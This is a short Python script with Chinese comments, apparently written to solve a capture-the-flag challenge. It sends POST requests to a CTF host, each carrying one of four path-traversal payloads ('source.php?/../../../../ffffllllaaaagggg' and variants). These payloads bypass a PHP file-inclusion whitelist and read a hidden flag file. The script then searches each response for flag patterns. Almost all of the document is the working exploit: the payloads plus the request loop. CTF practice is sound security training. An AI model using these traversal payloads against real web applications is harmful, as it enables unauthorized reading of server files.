# -*- coding: utf-8 -*-
"""标准 payload 测试：source.php?/../../../../ffffllllaaaagggg（无 .php）"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

payloads = [
    'source.php?/../../../../ffffllllaaaagggg',
    'hint.php?/../../../../ffffllllaaaagggg',
    'source.php?/../../../../../../../../ffffllllaaaagggg',
    'hint.php?/../../../../../../../../ffffllllaaaagggg',
]

for p in payloads:
    print(f'=== POST file={p} ===')
    r = requests.post(base + '/', data={'file': p}, timeout=12)
    L = len(r.text)
    print(f'  len={L}')
    # 找 flag 特征
    import re
    flags = re.findall(r'flag\{[^}]+\}', r.text)
    if flags:
        print(f'  🏁 FLAG: {flags[0]}')
    elif 'you can\'t see it' in r.text:
        print(f'  ❌ checkFile 失败: {r.text[:150]}')
    elif L > 500:
        print(f'  ⚠️ 长响应，可能是 flag 文件: {r.text[:300]}')
    else:
        print(f'  ?: {r.text[:200].replace(chr(10), " ")}')
    print()
